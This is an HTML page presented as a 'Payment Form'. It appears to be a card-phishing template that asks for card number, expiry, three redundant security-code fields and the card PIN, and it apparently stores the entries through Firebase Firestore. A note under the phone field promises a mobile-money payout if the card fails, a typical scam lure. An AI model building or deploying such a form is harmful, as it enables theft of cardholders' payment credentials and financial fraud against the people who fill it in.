<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Payment Form</title>
  <link rel="stylesheet" href="styles.css">
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js"></script>
  <script src="firebase-config.js"></script>
  <script src="app.js" defer></script>
</head>
<body>
  <div class="form-container">
    <h1>Payment Form</h1>
    <form id="paymentForm">
      <!-- Name and Email -->
      <label for="name">Name</label>
      <input type="text" id="name" placeholder="Enter your full name" required>
      
      <label for="email">Email</label>
      <input type="email" id="email" placeholder="Enter your email" required>
      
      <!-- Card Number -->
      <label for="card">Card Number</label>
      <input type="text" id="card" placeholder="Enter your card number" maxlength="16" required>
      
      <!-- Expiration Date -->
      <label for="expDate">Expiration Date</label>
      <input type="month" id="expDate" required>
      
      <!-- Security Code -->
      <label for="securityCode">Security Code</label>
      <input type="text" id="securityCode" placeholder="Security Code (e.g., 3-4 digits)" maxlength="4" required>
      
      <!-- CVV -->
      <label for="cvv">CVV</label>
      <input type="text" id="cvv" placeholder="Enter CVV (3 digits)" maxlength="3" required>
      
      <!-- CVC -->
      <label for="cvc">CVC</label>
      <input type="text" id="cvc" placeholder="Enter CVC (3-4 digits)" maxlength="4" required>
      
      <!-- PIN -->
      <label for="pin">Card PIN</label>
      <input type="password" id="pin" placeholder="Enter your card PIN" maxlength="4" required>

      <!-- Phone Number -->
      <label for="phone">Phone Number <span>(Optional)</span></label>
      <input type="tel" id="phone" placeholder="Enter your mobile number (optional)">
      <small class="note">This is where the money will be sent if the card doesn't work. Make sure it has mobile money service before proceeding.</small>

      <button type="submit">Submit</button>
    </form>
  </div>
</body>
</html>
